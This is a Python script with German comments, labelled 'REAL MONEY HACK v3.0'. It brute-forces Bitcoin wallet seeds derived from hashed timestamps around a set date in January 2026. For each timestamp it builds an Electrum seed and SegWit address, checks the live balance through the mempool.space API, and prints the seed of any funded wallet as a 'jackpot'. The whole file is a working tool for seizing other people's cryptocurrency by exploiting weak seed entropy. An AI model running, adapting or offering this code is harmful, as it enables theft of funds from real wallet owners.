import hashlib
import time
import requests
import sys
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- ELECTRUM IMPORTE ---
from electrum.mnemonic import Mnemonic, is_new_seed
from electrum import version, bitcoin, keystore
from electrum.bip32 import BIP32Node
from electrum import constants

# Netzwerk auf Mainnet zwingen
constants.net = constants.BitcoinMainnet

# --- KONFIGURATION ---
FIXED_YEAR = 2026
FIXED_MONTH = 1
FIXED_DAY = 13       # <-- Prüfen!

TARGET_HOUR = 10
TARGET_MINUTE = 30

# WICHTIG: Für die Demo nicht zu hoch stellen!
# 300 Sekunden = 5 Minuten Radius (ca. 600 Adressen)
# Das dauert etwa 2-3 Minuten.
SEARCH_RADIUS_SECONDS = 300  
MAX_WORKERS = 8              # Etwas aggressiver (8 Threads)
# ---------------------

def check_balance_safe(address):
    try:
        url = f"https://mempool.space/api/address/{address}"
        # Kurzer Timeout, damit es schneller weitergeht
        response = requests.get(url, timeout=3) 
        if response.status_code == 200:
            data = response.json()
            balance = data['chain_stats']['funded_txo_sum'] - data['chain_stats']['spent_txo_sum']
            balance += data['mempool_stats']['funded_txo_sum'] - data['mempool_stats']['spent_txo_sum']
            return balance
    except Exception:
        pass
    return 0

def process_timestamp(ts, mnemo):
    # 1. Seed generieren
    t_str = str(ts)
    h = hashlib.sha256(t_str.encode('utf-8')).hexdigest()
    entropy = int(h, 16)
    
    nonce = 0
    while True:
        nonce += 1
        i = entropy + nonce
        seed = mnemo.mnemonic_encode(i)
        if is_new_seed(seed, version.SEED_PREFIX_SW):
            break
            
    # 2. Adresse berechnen
    try:
        seed_bytes = mnemo.mnemonic_to_seed(seed, passphrase='')
        root = BIP32Node.from_rootseed(seed_bytes, xtype='p2wpkh')
        node = root.subkey_at_private_path("m/84'/0'/0'/0/0")
        pubkey = node.eckey.get_public_key_hex()
        address = bitcoin.pubkey_to_address('p2wpkh', pubkey)
        
        # 3. Check
        sats = check_balance_safe(address)
        return (ts, seed, address, sats)
        
    except Exception:
        return None

def hack_final():
    target_dt = datetime(FIXED_YEAR, FIXED_MONTH, FIXED_DAY, TARGET_HOUR, TARGET_MINUTE, 0)
    center_ts = int(target_dt.timestamp())
    start_ts = center_ts - SEARCH_RADIUS_SECONDS
    end_ts = center_ts + SEARCH_RADIUS_SECONDS
    
    total_steps = end_ts - start_ts + 1
    completed_steps = 0

    print(f"--- REAL MONEY HACK v3.0 (Visual) ---")
    print(f"Ziel: {target_dt}")
    print(f"Umfang: {total_steps} Adressen zu prüfen")
    print("-" * 60)
    
    # Start-Anzeige sofort erzwingen
    print(f"\r[  0.0%] Starte Threads...", end="", flush=True)

    mnemo = Mnemonic('en')
    timestamps = range(start_ts, end_ts + 1)
    
    # Executor startet
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_ts = {executor.submit(process_timestamp, ts, mnemo): ts for ts in timestamps}
        
        for future in as_completed(future_to_ts):
            completed_steps += 1
            progress = (completed_steps / total_steps) * 100
            
            result = future.result()
            if result:
                ts, seed, address, sats = result
                
                # OPTIK: Zeile überschreiben (\r) und SOFORT anzeigen (flush=True)
                print(f"\r[{progress:5.1f}%] Scan: {address} ", end="", flush=True)
                
                if sats > 0:
                    readable_time = datetime.fromtimestamp(ts).strftime('%H:%M:%S')
                    print(f"\r{' ' * 80}", end="\r") # Zeile putzen
                    print(f"🔥🔥🔥 JACKPOT GEFUNDEN! 🔥🔥🔥")
                    print(f"Zeitpunkt: {readable_time}")
                    print(f"Seed:      {seed}")
                    print(f"Adresse:   {address}")
                    print(f"Guthaben:  {sats / 100_000_000:.8f} BTC")
                    print("-" * 60)
                    # Sound abspielen (optional für Windows)
                    print('\a') 
                    sys.exit(0)

    print("\nScan beendet. Nichts gefunden.")

if __name__ == "__main__":
    try:
        hack_final()
    except KeyboardInterrupt:
        print("\nAbbruch.")
    input("\nDrücke Enter...")